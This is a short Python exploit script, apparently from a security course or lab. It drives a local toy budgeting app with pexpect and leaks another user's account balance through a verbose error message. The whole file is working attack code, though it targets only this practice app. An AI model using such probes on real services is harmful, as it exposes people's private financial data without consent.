"""Budget Hacker exploit script. Exposes Alice's account balance."""

import pexpect
import re


# Credentials for the user account used to send the money
SENDER_EMAIL = "bob@gmail.com"
SENDER_PASSWORD = "password"

# Email of the user whose account balance will be exposed
RECIPIENT_EMAIL = "alice@gmail.com"

# Maximum allowed account balance
MAX_BALANCE = "99999999.99"


def main():
    """Exploit the Budget Hacker vulnerability to expose Alice's account balance."""
    # Start the Budget Hacker application
    process = pexpect.spawn("python src/app.py", timeout=5, echo=False)

    # Select "Log In"
    process.expect_exact("Choice: ")
    process.sendline("0")

    # Log in as Bob
    process.expect_exact("Email: ")
    process.sendline(SENDER_EMAIL)
    process.expect_exact("Password: ")
    process.sendline(SENDER_PASSWORD)

    # Select "Add Income"
    process.expect_exact("Choice: ")
    process.sendline("0")

    # Add income to hit the maximum account capacity
    process.expect_exact("Amount: $")
    process.sendline("99999999.99")
    process.expect_exact("Description: ")
    process.sendline("Maximize Bob's account for the exploit")
    process.expect_exact("Add more income? (y or n): ")
    process.sendline("n")

    # Select "Send Money"
    process.expect_exact("Choice: ")
    process.sendline("2")

    # Enter the required information to send money to Alice
    process.expect_exact("Recipient email: ")
    process.sendline(RECIPIENT_EMAIL)
    process.expect_exact("Amount to send: ")
    process.sendline("99999999.99")
    process.expect_exact("Description: ")
    process.sendline("Send money to expose Alice's account balance")
    process.expect_exact("(y or n): ")
    process.sendline("y")
    process.expect_exact("Would you like to try again? (y or n): ")

    # Parse the recipient's exposed account balance from the error message
    # Example message:
    #   "Error sending money: Amount $99999999.99 plus current balance $12345.00 exceeds the maximum
    #   allowed account balance of $99999999.99."
    error_msg = process.before.decode("ascii").rstrip()
    match = re.search(r"current balance (.*) exceeds", error_msg)
    exposed_balance = match.group(1)

    print(f"Discovered the account balance for {RECIPIENT_EMAIL}: {exposed_balance}")


if __name__ == "__main__":
    main()
